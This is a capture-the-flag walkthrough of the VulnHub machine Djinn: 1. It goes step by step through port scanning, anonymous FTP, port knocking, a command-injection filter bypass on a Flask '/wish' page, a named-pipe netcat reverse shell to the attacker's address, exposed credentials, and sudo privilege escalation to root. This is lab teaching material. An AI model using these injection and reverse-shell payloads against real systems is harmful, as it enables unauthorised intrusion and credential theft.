<h1 align="center">
  <br>
  <a href="https://www.vulnhub.com/entry/djinn-1,397/">
    Vulnhub's Djin: 1
  </a>
  <br>
</h1>

<h4 align="center">
  CTF By <a href="https://twitter.com/0xmzfr">0xmzfr</a>
<br>
  Walkthrough By <a href="https://n0khodsia.github.io/">n0khodsia</a>
  <br>
  27/11/2019
</h4>

***


## LAUNCH
For this CTF I'll use Kali Linux on VMWare.  
After launching the Djin VM, the following screen pops off, giving us a head-start with the machine's IP:

![](images/djin1/ip.png)

On our Kali machine, we match the hostname `ctf` to the IP:
```bash
nano /etc/hosts

27.0.0.1       localhost
127.0.1.1       kali
192.168.1.102   ctf
```

## NMAP
Let's start by scanning the target:

```bash
root@kali:~# nmap -sV -p- ctf
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-27 12:35 EST
Nmap scan report for ctf (192.168.1.102)
Host is up (0.00055s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open      ftp     vsftpd 3.0.3
22/tcp   filtered  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
1337/tcp open      waste?
7331/tcp open      http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
MAC Address: 00:0C:29:3D:F0:FA (VMware)
```

As we can see, we have 4 different ports: FTP(21), SSH(22), Unknown(1337) and HTTP (7331).

## FTP
Let's try and connect to the FTP server with anonymous username (and no password)  
![](images/djin1/ftp.png)

It works, and we have 3 different files `message.txt`, `gamee.txt` & `creds.txt`:
```bash
root@kali:~# cat message.txt
@nitish81299 I am going on holidays for few days, please take care of all the work.
And don't mess up anything.
root@kali:~# cat game.txt
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the
final level and get the prize.
root@kali:~# cat creds.txt
nitu:81299
```

Game on port 1337? let's check it out.

## PORT 1337
Trying to connect to port 1337 with Netcat, gives us the following message:
```bash
root@kali:~# nc ctf 1337
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|


Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(8, '*', 7)
> 100
Wrong answer
root@kali:~# nc ctf 1337
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|


Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(3, '/', 3)
> 1
(5, '/', 9)
>

```
This little game will only accept the correct answer to a mathematical equation,
and will provide us with another equation if we answer correctly.

It looks like the goal is to create a loop that will recieve and solve equations a thousand times within the same connection.

I have written a script in Bash that receives the equation,
strips all the unnecessary characters, solves it and sends it back to the program:

```bash
#!/bin/bash
exec 3<>/dev/tcp/ctf/1337                                             #start the connection
prob1=$(head -10 <&3 | awk '/^Answer/ {getline; print}')              #grep the line below 'answer'
prob2=$(echo $prob1 | sed 's|[()'\'',]||g')                           #strip chars from equation
let a="$prob2"                                                        #solve the equation
echo $a >&3                                                           #send the solution back

count=1                                                               #counter for loop
for i in {1..1000}                                                    #repeat loop 1000 times
do
cycle1=$(head -1 <&3)                                                 #receive the next equation
cycle2=$(echo $cycle1 | sed 's|[()'\'',]||g')                         #strip chars from equation
let b="$cycle2"                                                       #solve the equation
echo "$count # Query received: $cycle1 - Math is: $cycle2 = $b"       #verbosity
echo $b >&3                                                           #send the solution back
count=$(expr $count + 1)                                              #add +1 to the loop count
done

head -100 <&3                                                         #after 1000 repeats, show the
                                                                      #first 100 rows of the programs output
```

After executing my script, we receive the 'gift':
```bash
996 # Query received: (9, '-', 3) - Math is: 9 - 3 = 6
997 # Query received: (8, '*', 4) - Math is: 8 * 4 = 32
998 # Query received: (8, '/', 9) - Math is: 8 / 9 = 0
999 # Query received: (9, '+', 1) - Math is: 9 + 1 = 10
1000 # Query received: (9, '+', 3) - Math is: 9 + 3 = 12
Here is your gift, I hope you know what to do with it:

1356, 6784, 3409
```

This combination of numbers had me confused at first, until I realised it's a [**port knocking sequence**](https://en.wikipedia.org/wiki/Port_knocking)!

## Port Knocking

Now we try port knocking with the sequence we received:
```bash
root@kali:~# knock -v ctf 1356, 6784, 3409
hitting tcp 192.168.1.102:1356
hitting tcp 192.168.1.102:6784
hitting tcp 192.168.1.102:3409
```

Followed by another full port scan to see if anything has changed:
```bash
root@kali:~# nmap -sV -p- ctf
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-27 12:39 EST
Nmap scan report for ctf (192.168.1.102)
Host is up (0.00055s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open      ftp     vsftpd 3.0.3
22/tcp   filtered  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
1337/tcp open      waste?
7331/tcp open      http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
MAC Address: 00:0C:29:3D:F0:FA (VMware)
```

It looks like the port knocking changed the SSH port from filtered to open.
I tried every possible combination with the info we got from our 3 FTP files, but had no successful login.
So, we move forward on to the HTTP service.

## HTTP
Port 7331 offers us a website running with Werkzeug httpd 0.16.0

Trying the regular scans give us no results.  
We try to run `dirb` again, but this time using the huge `rockyou.txt` password file.

After a couple of minutes, we found that the directory `/wish` exists on the web-server.  
`/wish` offers us an input that leads to OS command injection:
![](images/djin1/http2.png)

But theres a catch. Several characters such as `. $ / ^ ;` are blocked from being sent, so getting a reverse shell feels impossible with these restrictions.

So now we want to perhaps try and view the source code in order to fully understand why certain characters are being blocked.
Luckily, the command `python -m SimpleHTTPServer 8080` was not blocked, letting us open a web server on port 8080 and see the content it's files:
![](images/djin1/http3.png)

App.py (which handles the servers' requests) had the following piece in it's source code:
```python
CREDS = "/home/nitish/.dev/creds.txt"

RCE = ["/", ".", "?", "*", "^", "$", "eval", ";"]


def validate(cmd):
    if CREDS in cmd and "cat" not in cmd:
        return True

    try:
        for i in RCE:
            for j in cmd:
                if i == j:
                    return False
        return True
    except Exception:
        return False

```

By reading this we can understand that if we add `"/home/nitish/.dev/creds.txt"` to our command injection,
while not having the `cat` command at the same time, we will be able to bypass the restrictions we encountered earlier, use all characters and establish a reverse shell.

First of all, we must listen for incoming connections on our Kali machine:
```bash
nc -nlvp 7777
```

Next, we try to establish the reverse shell. `%26%26` is the URL encoding for `&&`,
which lets us bypass character blocking because `/home/nitish/.dev/creds.txt` is technically a part of the command:
```http
POST /wish HTTP/1.1
Host: ctf:7331
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf:7331/wish
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Connection: close
Upgrade-Insecure-Requests: 1

cmd=ls /tmp/backpipe p  %26%26 /home/nitish/.dev/creds.txt
```

Followed by this command to connect to my nc listener:
```
cmd=/bin/sh 0</tmp/backpipe | nc 192.168.1.103 443 1>/tmp/backpipe  %26%26 /home/nitish/.dev/creds.txt
```

Connected successfully as the user `www-data`:
```bash
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.103] from (UNKNOWN) [192.168.1.102] 57234
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let's have a look at the content of `/home/nitish/.dev/creds.txt`:
```sh
cat /home/nitish/.dev/creds.txt
nitish:p4ssw0rdStr3r0n9
```

Looks like SSH credentials!

## Privilege Escalation
Trying to login to SSH with the credentials above was successful, and we got the user flag:
```bash
nitish@djinn:~$ ls
user.txt
nitish@djinn:~$ cat user.txt
10aay8289ptgguy1pvfa73alzusyyx3c
```

Now let's check for sudo permissions using `sudo -l`:
```bash
nitish@djinn:~$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
nitish@djinn:~$ genie
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
genie: error: the following arguments are required: wish
```

User *nitish* can run `/usr/bin/genie/` with *sam*'s permissions.  
The binary program `genie` takes different arguments, and does not seem to help us get anything by using it 'as planned'.

Let's try and get some info about `genie` using `strings`:
```bash
nitish@djinn:~$ strings /usr/bin/genie

help
exit
--exec
bash
args
--god
-cmd
/bin/
;*3$"

```

As we can see, the argument `-cmd` exists in `strings` output, but not in the -h(elp) menu within `genie`.
Looks like a hidden argument. Let's give it a try:
```bash
nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd id
my man!!
$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
```

We have escalated into the user *sam*.
Let's upgrade to /bin/bash and `sudo -l` as *sam*:
```bash
$ /bin/bash
sam@djinn:~$ sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
```

User *sam* can run `/root/lago/` with *root* permissions.
Looks like another binary program. Let's execute it:
```bash
sam@djinn:~$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:
```

This one took the most time for me to crack.  
Option 2 (Guess the number) gives us the following challenge:
```bash
Choose a number between 1 to 100:
Enter your number:
```

After messing around and trying different methods, i thought of entering 'num' instead of a number,
in order to confuse the program and create a situation where "num = num",
meaning we technically 'guessed' the number. To my surprise, it actually worked:
```bash
Choose a number between 1 to 100:
Enter your number: num
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
lago  proof.sh
```

We gained root access! let's try and run `proof.sh`:
```bash
    _                        _             _ _ _
   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
  / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
 / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)
                                     |___/       
djinn pwned...
__________________________________________________________________________

Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc
Path: /home/sam
Date: Thu Nov 28 04:10:15 IST 2019
Whoami: root
__________________________________________________________________________

By @0xmzfr

Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)
```

## This has been a fun challenge, covering various aspects of cybersecurity.
## Thank you so much <a href="https://twitter.com/0xmzfr">@0xmzfr</a> for this amazing CTF!


***
<p align="center">Written by n0khodsia</p>
